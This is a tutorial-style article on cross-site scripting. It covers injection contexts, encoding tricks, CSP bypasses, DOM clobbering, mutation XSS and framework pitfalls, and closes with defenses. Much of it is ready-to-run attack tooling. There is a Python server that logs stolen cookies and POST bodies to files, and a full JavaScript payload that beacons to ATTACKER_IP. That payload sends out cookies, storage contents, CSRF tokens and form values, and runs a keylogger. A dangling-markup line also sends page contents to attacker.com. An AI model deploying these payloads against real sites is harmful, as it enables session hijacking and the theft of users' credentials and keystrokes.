XSS

Cross-Site Scripting - injecting JavaScript into web pages for session hijacking, keylogging, and client-side exploitation.

Overview

Cross-Site Scripting is the browser-side counterpart to server injection: the server reflects or stores attacker data, the browser parses that data as executable markup, and the resulting script runs with the origin's privileges. The script can read cookies and storage, issue authenticated requests on the victim's behalf, and rewrite the page. This article covers the injection contexts, the payload construction and encoding tricks that survive filters, Content Security Policy bypasses, and the defenses that terminate execution.

Required Reading

  • HTTP - HTTP cookies, headers, Same-Origin Policy, Content-Type
  • Authentication - session cookies, authentication tokens, HttpOnly, Secure flags

The Attack Surface

Every piece of user data that reaches the browser without proper encoding is a potential XSS sink. The attacker's goal is to inject code that executes in the victim's browser, in the context of the vulnerable application's origin. That code has access to the victim's cookies, localStorage, DOM , and can make authenticated requests on their behalf. 

User Input → Server → HTML Response → Browser Parses → DOM
                  ↑
          Injection Point

The Same-Origin Policy (SOP) restricts what an attacker's script can access cross-origin, but it DOES NOT prevent scripts already executing within an origin from accessing that origin's resources. XSS injects scripts into the target origin, so SOP is irrelevant.

XSS Classification

Type Mechanism Trigger Lifetime
Reflected Server echoes user input in HTTP response Victim clicks crafted link One request
Stored Server stores malicious input in database, serves it to users Victim visits infected page Persistent
DOM-based Client-side JavaScript writes user-controlled data to DOM Victim visits crafted URL Single page load
Blind Payload executes in a context the attacker can't see (admin panel, support ticket) Admin/staff views injected content Depends on context
mXSS Browser HTML parser normalizes "safe" HTML into dangerous HTML Victim visits page with mutated markup Page load

Context-Aware Payload Construction

The injection context determines how you escape the current syntax and inject your own code. Context matters more than the payload itself.

HTML Context

Input lands between HTML tags. The simplest case. 

<div>USER_INPUT</div>

Payload: <script>alert(document.domain)</script>

Result

<div><script>alert(document.domain)</script></div>

Any HTML tag works. <img> , <svg> , <body> , <video> , <details> - all valid vectors. <script> is just the most common.

Attribute Context

Input lands inside a tag attribute value.

<input type="text" value="USER_INPUT">

Escape the attribute

"><script>alert(1)</script>

Result

<input type="text" value=""><script>alert(1)</script>">

Event Handler Injection

" onfocus="alert(1)" autofocus="

Result

<input type="text" value="" onfocus="alert(1)" autofocus="">

JavaScript Context

Input lands inside a <script> block or inline event handler. 

<script>var name = 'USER_INPUT';</script>

Escape the string

'; alert(1); //

Result

var name = ''; alert(1); //';

Template literal context

<script>var name = `USER_INPUT`;</script>

Payload: ${alert(1)}

CSS Context

Input lands inside <style> tags or inline style attributes. 

<style>body { background: USER_INPUT; }</style>

Payload

url("javascript:alert(1)")
red } body { background: url("javascript:alert(1)")

IE CSS Expression

expression(alert(1))

URL Context

Input lands in a href , src , or action attribute that expects a URL . 

<a href="USER_INPUT">link</a>

Payload: javascript:alert(1) 

<a href="javascript:alert(1)">link</a>

<keygen autofocus onfocus="alert(1)">               <!-- Obsolete but present -->

Encoding Tricks

<img src=x onerror="&#97;&#108;&#101;&#114;&#116;(1)">

<!-- Hex HTML entities -->

<a href="javascript:%61lert(1)">click</a>

<!-- Unicode escapes (in JavaScript context) -->

<!-- Array destructuring abuse -->
<script>[...`${alert}\x281\x29`]</script>

<!-- Octal escape -->
<script>eval("\141\154\145\162\164\50\61\51")</script>

<!-- Base64 via eval -->
<script>eval(atob("YWxlcnQoMSk="))</script>

CSP Bypass

Content-Security-Policy restricts what scripts can execute. Bypassing CSP is the difference between " XSS is there" and " XSS is exploitable."

JSONP Endpoint Bypass

If the target hosts a JSON P endpoint on the same origin, and CSP allows it, the JSON P callback can execute arbitrary JavaScript: 

<script src="/api/jsonp?callback=alert(1)"></script>

The JSON P endpoint returns: alert(1)({"data": "value"});

Common JSON P patterns: 

callback=PAYLOAD
cb=PAYLOAD
jsonp=PAYLOAD
jsoncallback=PAYLOAD

Script Gadgets (AngularJS, RequireJS)

Framework code has DOM clobbering primitives and code execution helpers: 

<!-- AngularJS sandbox escape (pre-1.6) -->
{{constructor.constructor('alert(1)')()}}
{{'a'.constructor.prototype.charAt=[].join;$eval('x=1} } };alert(1)//');}}

<!-- AngularJS expression sandbox escape pattern -->
{{$on.constructor('alert(1)')()}}

<!-- Bypass with toString override -->
{{toString.constructor.prototype.toString=toString.constructor.prototype.call;["a","alert(1)"].sort(toString.constructor);}}

Dangling Markup Injection

When full XSS isn't possible but you can inject unclosed tags, subsequent page content is "captured" by the injected tag until a closing quote arrives: 

<img src='http://attacker.com/steal?data=

Everything between this injection and the next ' on the page is sent as part of the URL

  • including CSRF tokens, email addresses, or other sensitive

data in the page source.

Receiving server (attacker machine):

#!/usr/bin/env python3
"""Receive XSS exfiltrated cookies and session tokens."""
from http.server import HTTPServer, BaseHTTPRequestHandler
from urllib.parse import urlparse, parse_qs
from datetime import datetime

class StealHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        parsed = urlparse(self.path)
        params = parse_qs(parsed.query)
        client_ip = self.client_address[0]
        user_agent = self.headers.get('User-Agent', 'unknown')
        referer = self.headers.get('Referer', 'direct')

        print(f"\n{'='*60}")
        print(f"[{datetime.now()}] Request from {client_ip}")
        print(f"User-Agent: {user_agent}")
        print(f"Referer: {referer}")

        if parsed.path == '/hijack':
            cookie = params.get('cookie', ['NONE'])[0]
            print(f"COOKIE STOLEN: {cookie[:200]}")
            with open('stolen_cookies.txt', 'a') as f:
                f.write(f"{datetime.now()} | {client_ip} | {cookie}\n")

        elif parsed.path == '/alive':
            print(f"Beacon from {client_ip} — session still active")

        elif parsed.path == '/secrets':
            data = params.get('d', ['{}'])[0]
            print(f"SECRETS: {data[:500]}")

        self.send_response(200)
        self.send_header('Access-Control-Allow-Origin', '*')
        self.end_headers()
        self.wfile.write(b'ok')

    def do_POST(self):
        content_length = int(self.headers.get('Content-Length', 0))
        body = self.rfile.read(content_length).decode('utf-8', errors='replace')
        print(f"[{datetime.now()}] POST data: {body[:500]}")
        with open('stolen_post.txt', 'a') as f:
            f.write(f"{datetime.now()} | {body}\n")
        self.send_response(200)
        self.send_header('Access-Control-Allow-Origin', '*')
        self.end_headers()
        self.wfile.write(b'ok')

    def log_message(self, format, *args):
        pass  # Suppress default logging

if __name__ == '__main__':
    server = HTTPServer(('0.0.0.0', 8888), StealHandler)
    print("XSS Exfiltration Server running on port 8888...")
    server.serve_forever()

DOM Clobbering

When an application references global variables that mirror DOM elements, injecting HTML elements with matching id or name attributes overwrites those variables. 

<!-- Application code: -->
<script>
var config = window.config || { debug: false };
if (config.debug) {
    // sensitive code path
}
</script>

<!-- Attacker injects: -->
<a id="config" href="https://evil.com" name="debug"><a id="config" name="debug" href="https://evil.com">

<!-- Now: window.config is the HTMLAnchorElement, not the JS object -->
<!-- config.debug is true (the anchor has a 'debug' name) -->
<!-- config.href is "https://evil.com" -->

Exploitation: Override submit function on forms, toString methods, SCRIPT src attributes, and framework globals (Angular JS $scope via DOM clobbering).

Mutation XSS (mXSS)

The browser's HTML parser has complex normalization rules. Some "safe" HTML strings become dangerous after parsing and re-serialization. The attack chain:

  1. Server sanitizes input (e.g., DOMPurify.sanitize(input) )
  2. Sanitizer produces "safe" HTML
  3. Browser parses the safe HTML
  4. Browser normalizes it - creating dangerous HTML the sanitizer didn't catch
<!-- mXSS via <table> misparsing in older Chrome/Firefox -->
<table><math><mtext><table><mglyph><style><img src=x onerror=alert(1)>

The browser's tree builder sees <table> inside <mtext> and re-arranges the DOM , causing the <img> to become active where the sanitizer thought it was inert. 

<!-- mXSS via <listing> element -->
<listing><img src=1 onerror=alert(1)></listing>
<!-- InnerHTML reparse of listing creates active <img> -->

XSS in Frameworks

React

// Vulnerable: dangerouslySetInnerHTML
<div dangerouslySetInnerHTML={{ __html: userInput }} />

// Also vulnerable: direct href with javascript: pseudo-protocol
<a href={userInput}>click</a>  // userInput = "javascript:alert(1)"

// Safe: JSX auto-escapes content in text context
<div>{userInput}</div>

// Vulnerable pattern: passing user input to React.createElement tag
const DynamicTag = userInput;  // "script"
return <DynamicTag>content</DynamicTag>;

Vue.js

<!-- Vulnerable: v-html -->
<div v-html="userInput"></div>

<!-- Vulnerable: dynamic component rendering -->
<component :is="userInput"></component>

<!-- Vulnerable: template interpolation into attribute -->
<a :href="userInput">link</a>  <!-- userInput = "javascript:alert(1)" -->

<!-- Safe: text interpolation -->
<div>{{ userInput }}</div>

Angular

<!-- Vulnerable: bypassing DomSanitizer -->

Writing a Modular XSS Payload

A complete payload that combines multiple capabilities:

(function() {
    // Configuration
    var C2 = 'http://ATTACKER_IP:8888';
    var BEACON_INTERVAL = 10000;  // 10 seconds

    // Helper: send data to C2
    function beacon(path, data) {
        var img = new Image();
        img.src = C2 + path + '?d=' + encodeURIComponent(JSON.stringify(data)) + '&r=' + Math.random();
    }

    // 1. Steal cookies and session data immediately
    var session_data = {
        url: location.href,
        cookie: document.cookie,
        localStorage: JSON.stringify(localStorage),
        sessionStorage: JSON.stringify(sessionStorage),
        userAgent: navigator.userAgent,
        referrer: document.referrer,
        title: document.title
    };
    beacon('/session', session_data);

    // 2. Setup keylogger
    var keys = [];
    document.addEventListener('keydown', function(e) {
        keys.push({ k: e.key, t: e.target.tagName, ts: Date.now() });
        if (keys.length >= 20) {
            beacon('/keys', keys);
            keys = [];
        }
    });

    // 3. Steal CSRF tokens
    var meta_token = document.querySelector('meta[name="csrf-token"]')?.content;
    var input_token = document.querySelector('input[name="csrf_token"], input[name="_token"]')?.value;
    if (meta_token || input_token) {
        beacon('/csrf', { meta: meta_token, input: input_token });
    }

    // 4. Periodic beacon to maintain session awareness
    setInterval(function() {
        beacon('/alive', { url: location.href, t: Date.now() });
    }, BEACON_INTERVAL);

    // 5. Try to exfiltrate page source for sensitive forms
    var forms = document.querySelectorAll('form');
    var form_data = [];
    forms.forEach(function(f) {
        form_data.push({
            action: f.action,
            method: f.method,
            inputs: [...f.querySelectorAll('input')].map(i => ({
                name: i.name, type: i.type, value: i.value
            }))
        });
    });
    if (form_data.length > 0) {
        beacon('/forms', form_data);
    }
})();

Detection

Manual testing

# Test for reflection — basic HTML injection
curl 'http://target/search?q=<script>alert(1)</script>' -s | grep -i '<script>alert'

# Test attribute context
curl 'http://target/search?q="onfocus="alert(1)"autofocus="' -s | grep -i 'onfocus'

# Test JavaScript context
curl 'http://target/search?q=' -s | grep -i "'; alert(1);"

# Automated with paramscan
ffuf -u 'http://target/FUZZ?q=<script>alert(1)</script>' -w wordlist.txt -fc 404

Burp Suite scanner check: Send a request, look for <script> tags in the response, check if alert(document.cookie) produces a popup in the built-in Chromium browser.

DOM XSS detection with browser devtools

// In console — check if URL parameters reach sinks
location.search  // current query string

Fixes

Defense What It Protects Against Effectiveness
HTML Entity Encoding HTML context injection Essential for server-side rendering
JavaScript Encoding JavaScript context injection Prevents string escapes
URL Encoding URL context injection Preventsjavascript:injection
Content-Security-Policy (CSP) All script injection Defense in depth - blocks inline scripts, restricts sources
HttpOnly Cookies Cookie theft via JavaScript Preventsdocument.cookieaccess
X-XSS-Protection (deprecated) Reflected XSS Browser-level filter, retired
DOMPurify.sanitize() Stored XSS in user content Client-side sanitization for rich text
React/Vue Auto-escaping Framework-level XSS Default safe:{var}auto-encodes,v-html/dangerouslySetInnerHTMLmust be explicit

CSP example

Content-Security-Policy: default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline'; img-src 'self' data:;

This allows scripts only from the same origin, blocks inline <script> and event handlers, but allows inline styles and data URI s for images.

DOMPurify usage for user-generated HTML

import DOMPurify from 'dompurify';
const clean = DOMPurify.sanitize(userHtml, {
    ALLOWED_TAGS: ['b', 'i', 'em', 'strong', 'a', 'p', 'br', 'ul', 'ol', 'li'],
    ALLOWED_ATTR: ['href', 'title']
});
document.getElementById('content').innerHTML = clean;
